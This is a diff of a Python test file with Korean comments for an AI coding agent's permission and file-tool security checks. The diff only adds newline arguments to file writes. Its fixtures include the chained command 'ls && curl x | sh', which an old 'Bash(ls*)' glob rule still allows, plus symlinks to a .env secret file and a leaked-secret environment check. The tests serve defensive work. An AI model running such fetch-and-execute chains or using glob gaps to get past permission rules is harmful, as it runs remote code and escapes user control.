@@ -88,7 +88,7 @@ def test_s1_add_always_allow_exact_only(tmp_path):           # 저장된 규칙�
 
 
 def test_s1_existing_yaml_rules_keep_cn_meaning(tmp_path):    # 이미 있는 규칙 해석은 cn과 같게
-    (tmp_path / "permissions.yaml").write_text("allow:\n  - Bash(ls*)\n", encoding="utf-8")   # cn이 저장한 넓은 규칙
+    (tmp_path / "permissions.yaml").write_text("allow:\n  - Bash(ls*)\n", encoding="utf-8", newline="")   # cn이 저장한 넓은 규칙
     svc = PermissionService(headless=False, global_dir=tmp_path)   # TUI 서비스
     bash = bash_mod.make_bash_tool(str(tmp_path))            # 내장 Bash 도구
     assert svc.check(bash, {"command": "ls && curl x | sh"}) == "allow"   # 기존 규칙은 cn처럼 글롭(사용자가 직접 지워야 함)
@@ -116,12 +116,12 @@ def test_s3_mid_word_hash_is_not_comment(monkeypatch):       # 셸 규칙대로 
 
 # ───────── S4: Read 의 심볼릭 링크 ─────────
 def test_s4_read_checks_realpath(ws, monkeypatch):           # 링크를 따라간 실제 경로로도 판정
-    (ws / ".env").write_text("SECRET=1\n")                   # 민감 파일
+    (ws / ".env").write_text("SECRET=1\n", newline="")                   # 민감 파일
     os.symlink(ws / ".env", ws / "notes.txt")                # 평범한 이름의 링크
     with pytest.raises(ContinueError) as e:                  # 거부 기대
         run(READ_TOOL.preprocess({"filepath": "notes.txt"}))  # 링크로 읽기
     assert str(e.value) == security_msg("notes.txt") and e.value.reason == "file_is_security_concern"   # cn과 같은 글(모델이 준 경로)
-    (ws / "ok.txt").write_text("hi")                         # 평범한 파일
+    (ws / "ok.txt").write_text("hi", newline="")                         # 평범한 파일
     os.symlink(ws / "ok.txt", ws / "ok_link.txt")            # 평범한 링크
     assert run(READ_TOOL.preprocess({"filepath": "ok_link.txt"})).preview[0].content == "Will read ok_link.txt"   # 평범한 링크는 통과
     monkeypatch.setenv(COMPAT_ENV, "1")                      # cn 동작
@@ -169,7 +169,7 @@ def test_s6_write_rejects_sensitive(ws, monkeypatch):        # Write 도 같은 
         with pytest.raises(ContinueError) as e:              # 거부 기대
             run(WRITE_TOOL.preprocess({"filepath": p, "content": "x"}))   # 쓰기 preprocess
         assert str(e.value) == security_msg(p[2:] if p.startswith("./") else p)   # Read 와 같은 글
-    (ws / ".env").write_text("A=1")                          # 민감 파일
+    (ws / ".env").write_text("A=1", newline="")                          # 민감 파일
     os.symlink(ws / ".env", ws / "plain.txt")                # 링크
     with pytest.raises(ContinueError):                       # 링크로 쓰기도 거부
         run(WRITE_TOOL.preprocess({"filepath": "plain.txt", "content": "x"}))   # 링크 대상 판정
@@ -188,7 +188,7 @@ def fake_rg(ws, monkeypatch):                                # 받은 패턴을 
     rg = bin_dir / "rg"                                      # 가짜 rg
     rg.write_text('#!/bin/sh\nif [ "$1" = "--version" ]; then echo "ripgrep 14"; exit 0; fi\n'   # 설치 확인 응답
                   'if [ "$5" = "!" ]; then echo "regex parse error" >&2; exit 2; fi\n'   # 오류 경우
-                  'printf "x.txt:1:%s\\n" "$5"\n')           # 다섯째 인자(패턴)를 그대로 출력
+                  'printf "x.txt:1:%s\\n" "$5"\n', newline="")           # 다섯째 인자(패턴)를 그대로 출력
     rg.chmod(rg.stat().st_mode | stat.S_IEXEC)               # 실행 권한
     monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ.get('PATH', '')}")   # 앞에 끼움
     monkeypatch.setenv("NCN_FIX_SECRET", "leaked")            # 셸이 풀면 드러나는 값
@@ -297,7 +297,7 @@ def test_b4_real_bash_run_korean(ws):                        # 실제 셸로 한
 @pytest.fixture                                              # Edit 시험 파일
 def edit_file(ws):                                           # Read 까지 마친 파일
     p = ws / "e.txt"                                         # 파일 경로
-    p.write_text("alpha\nbeta\ngamma\n")                     # 원본
+    p.write_text("alpha\nbeta\ngamma\n", newline="")                     # 원본
     run(READ_TOOL.run({"filepath": "e.txt"}, ToolRunContext("r")))   # Read 기록(Edit 전제)
     return p                                                 # 경로 반환
 
@@ -305,12 +305,12 @@ def edit_file(ws):                                           # Read 까지 마�
 def test_b6_edit_reapplies_on_change(edit_file, monkeypatch):   # 바뀐 내용에 다시 적용
     pre = run(EDIT_TOOL.preprocess({"file_path": str(edit_file), "old_string": "beta", "new_string": "BETA"}))   # 미리 계산
     assert pre.args[REDO_KEY] == {"old_string": "beta", "new_string": "BETA", "replace_all": False}   # 재료가 run 인자에
-    edit_file.write_text("alpha\nbeta\ngamma\ndelta (사용자 추가)\n")   # 승인 대기 중 사용자가 고침
+    edit_file.write_text("alpha\nbeta\ngamma\ndelta (사용자 추가)\n", newline="")   # 승인 대기 중 사용자가 고침
     out = run(EDIT_TOOL.run(pre.args, ToolRunContext("t")))  # 승인 뒤 실행
     assert edit_file.read_text() == "alpha\nBETA\ngamma\ndelta (사용자 추가)\n"   # 사용자 수정 보존 + 편집 적용
     assert out.startswith(f"Successfully edited {edit_file}\nDiff:\n") and "+delta" not in out   # diff 기준은 지금 내용
     pre = run(EDIT_TOOL.preprocess({"file_path": str(edit_file), "old_string": "gamma", "new_string": "G"}))   # 다음 편집
-    edit_file.write_text("alpha\nBETA\n")                    # 바꿀 글을 사용자가 지움
+    edit_file.write_text("alpha\nBETA\n", newline="")                    # 바꿀 글을 사용자가 지움
     with pytest.raises(ContinueError) as e:                  # 다시 찾기 실패
         run(EDIT_TOOL.run(pre.args, ToolRunContext("t")))    # 실행
     assert str(e.value) == 'Edit at index 0: string not found in file: "gamma"' and edit_file.read_text() == "alpha\nBETA\n"   # cn 형식 오류, 파일 안 바뀜
@@ -320,7 +320,7 @@ def test_b6_edit_compat_overwrites(edit_file, monkeypatch):  # cn 동작은 덮�
     monkeypatch.setenv(COMPAT_ENV, "1")                      # cn 동작
     pre = run(EDIT_TOOL.preprocess({"file_path": str(edit_file), "old_string": "beta", "new_string": "BETA"}))   # 미리 계산
     assert REDO_KEY not in pre.args                          # cn 인자 모양 그대로
-    edit_file.write_text("alpha\nbeta\ngamma\ndelta\n")      # 사용자가 고침
+    edit_file.write_text("alpha\nbeta\ngamma\ndelta\n", newline="")      # 사용자가 고침
     run(EDIT_TOOL.run(pre.args, ToolRunContext("t")))        # 실행
     assert edit_file.read_text() == "alpha\nBETA\ngamma\n"   # cn: 사용자 수정(delta) 사라짐
 
@@ -328,16 +328,16 @@ def test_b6_edit_compat_overwrites(edit_file, monkeypatch):  # cn 동작은 덮�
 def test_b6_multi_edit(edit_file, monkeypatch):              # MultiEdit 도 같게
     edits = [{"old_string": "alpha", "new_string": "A"}, {"old_string": "gamma", "new_string": "G"}]   # 두 편집
     pre = run(MULTI_EDIT_TOOL.preprocess({"file_path": str(edit_file), "edits": edits}))   # 미리 계산
-    edit_file.write_text("alpha\nbeta\ngamma\nzeta\n")       # 사용자가 고침
+    edit_file.write_text("alpha\nbeta\ngamma\nzeta\n", newline="")       # 사용자가 고침
     out = run(MULTI_EDIT_TOOL.run(pre.args, ToolRunContext("t")))   # 실행
     assert edit_file.read_text() == "A\nbeta\nG\nzeta\n" and out.startswith(f"Successfully edited {edit_file} with 2 edits\n")   # 다시 적용
     pre = run(MULTI_EDIT_TOOL.preprocess({"file_path": str(edit_file), "edits": [{"old_string": "beta", "new_string": "B"}, {"old_string": "zeta", "new_string": "Z"}]}))   # 다음
-    edit_file.write_text("A\nbeta\nG\n")                     # 둘째 편집 대상이 사라짐
+    edit_file.write_text("A\nbeta\nG\n", newline="")                     # 둘째 편집 대상이 사라짐
     with pytest.raises(ContinueError) as e:                  # 전부 아니면 전무
         run(MULTI_EDIT_TOOL.run(pre.args, ToolRunContext("t")))   # 실행
     assert str(e.value) == 'Edit at index 1: string not found in file: "zeta"' and edit_file.read_text() == "A\nbeta\nG\n"   # cn 형식 오류, 안 씀
     monkeypatch.setenv(COMPAT_ENV, "1")                      # cn 동작
     pre = run(MULTI_EDIT_TOOL.preprocess({"file_path": str(edit_file), "edits": [{"old_string": "beta", "new_string": "B"}]}))   # 미리 계산
-    edit_file.write_text("A\nbeta\nG\nnew\n")                # 사용자가 고침
+    edit_file.write_text("A\nbeta\nG\nnew\n", newline="")                # 사용자가 고침
     run(MULTI_EDIT_TOOL.run(pre.args, ToolRunContext("t")))  # 실행
     assert edit_file.read_text() == "A\nB\nG\n"              # cn: 사용자 수정 사라짐
